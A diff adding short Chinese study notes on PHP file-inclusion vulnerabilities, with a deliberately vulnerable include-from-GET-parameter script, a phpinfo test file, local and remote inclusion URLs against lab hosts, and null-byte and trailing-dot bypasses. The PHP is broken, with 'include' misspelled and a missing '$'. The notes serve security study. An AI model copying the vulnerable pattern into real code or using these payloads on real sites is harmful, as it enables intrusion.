@@ -1,0 +1,30 @@
+白盒：代码审计的方式
+黑盒：扫描工具，公开的漏洞，手动看参数以及功能点
+文件包含：将指定的文件当作代码执行
+
+本地包含：
+建立upload.php文件当服务
+(无限制) 
+<?php
+          filename=$_GET[filename]
+          inculde($filename)
+?>
+(有限制)
+<?php
+          filename=$_GET[filename]
+          inculde($filename.".html")
+?>
+建立1.txt文件执行
+<?php
+   phpinfo()
+?>
+http://localhost/include/upload.php?filename=1.txt
+
+远程包含：（无限制和有限制）（仅加上ip地址）
+http://localhost/include/upload.php?filename=192.168.140.130 1.txt
+
+绕过方式：
+%00    加超过验证的点   文件名修改为（.html）
+
+
+
